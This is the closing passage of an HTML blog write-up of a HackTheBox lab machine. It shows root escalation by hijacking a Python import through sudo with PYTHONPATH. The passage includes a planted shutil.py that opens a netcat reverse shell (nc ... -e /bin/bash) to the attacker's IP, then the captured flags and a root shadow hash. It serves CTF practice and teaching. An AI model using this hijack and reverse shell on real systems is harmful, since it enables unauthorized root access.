+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$EUID<span style=color:#e6db74>&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Running backup script in the background, it might take a while...&#34;</span>
+</span></span><span style=display:flex><span>        /opt/scripts/backup.py &amp;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Insufficient privileges to perform the selected operation.&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span></code></pre></div><p>It just launch <code>/opt/scripts/backup.py</code>, let&rsquo;s see that:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> shutil <span style=color:#f92672>import</span> make_archive
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>src <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/var/www/html/&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># old ftp directory, not used anymore</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#dst = &#39;/srv/ftp/html&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>dst <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/var/backups/html&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>make_archive(dst, <span style=color:#e6db74>&#39;gztar&#39;</span>, src)
+</span></span></code></pre></div><p>It looks like we&rsquo;ll have to mess with the python import system.</p><p>I won&rsquo;t explain to much here, if you want to understand the attack please read
+<a href=https://rawsec.ml/en/sigseg-2018-quals-write-ups/#100-Fun-avec-python-App-Script>SIGSEGv1 Quals 2018 - Write-ups - 100 - Fun avec python - App-Script</a>.</p><pre tabindex=0><code>$ mkdir -p /tmp/cyfun/
+$ cd /tmp/cyfun/
+$ vim.tiny shutil.py
+</code></pre><p><code>shutil.py</code> (a reverse-shell because spawning a PTY is useless as the python script is sent to background)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>make_archive</span>(no,ra,j):
+</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;nc 10.10.15.31 8888 -e /bin/bash&#34;</span>)
+</span></span></code></pre></div><p>Start a <a href=https://pwncat.org/>pwncat</a> listener: <code>pwncat -l 8888 -vv</code>.</p><p>Then let&rsquo;s call the script:</p><pre tabindex=0><code>$ sudo PYTHONPATH=/tmp/cyfun/ /opt/scripts/admin_tasks.sh
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+</code></pre><p>On our listener:</p><pre tabindex=0><code>$ pwncat -l 8888 -vv
+INFO: Listening on :::8888 (family 10/IPv6, TCP)
+INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)
+INFO: Client connected from 10.10.10.187:33374 (family 2/IPv4, TCP)
+id
+uid=0(root) gid=0(root) groups=0(root)
+pwd
+/tmp/cyfun
+cd /root
+cat root.txt
+9e96b615438b09b210be126a5e7d0577
+cat /home/waldo/user.txt
+30a8ad9cb41261bf0f97f75094358045
+cat /etc/shadow | grep root
+root:$6$M5g.E5/j$AO7lZNZXLFABZld5uGh/YB3J1Va4AG9Tmw1icvm2MsDOj6B1RFloUmnA9jcj4DIsILOedBvVQg66CVjGrd.fl0:18374:0:99999:7:::
+</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/blackfield/><span class=title>« Prev</span><br><span>Blackfield </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/travel/><span class=title>Next »</span><br><span>Travel</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
